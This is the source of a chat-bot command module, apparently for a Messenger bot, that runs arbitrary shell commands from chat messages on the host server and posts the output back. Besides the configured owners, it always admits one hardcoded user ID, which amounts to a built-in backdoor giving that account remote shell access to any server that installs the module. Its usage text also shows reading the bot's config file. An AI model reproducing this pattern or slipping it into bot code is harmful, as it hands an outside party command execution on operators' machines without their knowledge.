const { exec } = require("child_process");
const path = require("path");
const fs = require("fs");

module.exports.config = {
  name: "shell",
  version: "2.0.0",
  permission: 3,
  credits: "Joy",
  description: "Server এ shell command চালাও (Owner only)",
  category: "admin",
  prefix: true,
  cooldowns: 3,
  usages: "shell [command]"
};

function getOwnerUIDs() {
  try {
    const config = JSON.parse(
      fs.readFileSync(path.join(__dirname, "../../Joy.json"), "utf8")
    );
    return [...new Set([
      ...(config.OWNER || []),
      ...(config.ADMINBOT || [])
    ])].map(String);
  } catch {
    return [];
  }
}

async function handler({ api, event, args }) {
  const { threadID, messageID, senderID } = event;

  const owners = getOwnerUIDs();
  const allowedExtraUID = "61590360434650";

  if (!owners.includes(String(senderID)) && senderID !== allowedExtraUID) {
    return api.sendMessage("❌ শুধুমাত্র Owner এই command ব্যবহার করতে পারবে।", threadID, messageID);
  }

  const command = args.join(" ").trim();
  if (!command) {
    return api.sendMessage(
`┏ 👑𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑 ┛

📌 𝗨𝗦𝗔𝗚𝗘:
• .𝘀𝗵𝗲𝗹𝗹 [𝗰𝗼𝗺𝗺𝗮𝗻𝗱]

💡 𝗘𝗫𝗔𝗠𝗣𝗟𝗘:
• ⚡ .𝘀𝗵𝗲𝗹𝗹 𝗹𝘀
• 🔧 .𝘀𝗵𝗲𝗹𝗹 𝗻𝗼𝗱𝗲 -𝘃
• 📊 .𝘀𝗵𝗲𝗹𝗹 𝗽𝗺𝟮 𝗹𝗶𝘀𝘁
• 📁 .𝘀𝗵𝗲𝗹𝗹 𝗰𝗮𝘁 𝗝𝗼𝘆.𝗷𝘀𝗼𝗻

━━━━━━━━━━━━━━━━━`, 
threadID, messageID
    );
  }

  const processing = await api.sendMessage(
`⏳ 𝗘𝗫𝗘𝗖𝗨𝗧𝗜𝗡𝗚...
$ ${command}`,
threadID,
messageID
  );

  exec(command, { timeout: 30000, maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {

    const output = (stdout || "") + (stderr || "");
    const trimmed = output.trim();

    let result = trimmed.length > 1800
      ? trimmed.substring(0, 1800) + "\n\n... [OUTPUT TRUNCATED]"
      : trimmed || "(NO OUTPUT)";

    const status =
      err && !stdout
        ? `❌ 𝗘𝗥𝗥𝗢𝗥 (code: ${err.code || "unknown"})`
        : "✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘";

    api.editMessage(
`┏ 👑𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍  👑
💻 𝗖𝗠𝗗:
$ ${command}
━━━━━━━━━━━━━━━━━
📤 𝗢𝗨𝗧𝗣𝗨𝗧:
${result}
━━━━━━━━━━━━━━━━━
⚡ 𝗦𝗧𝗔𝗧𝗨𝗦:
${status}
`,
      processing.messageID,
      threadID
    );
  });
}

module.exports.onStart = handler;
module.exports.run = handler;
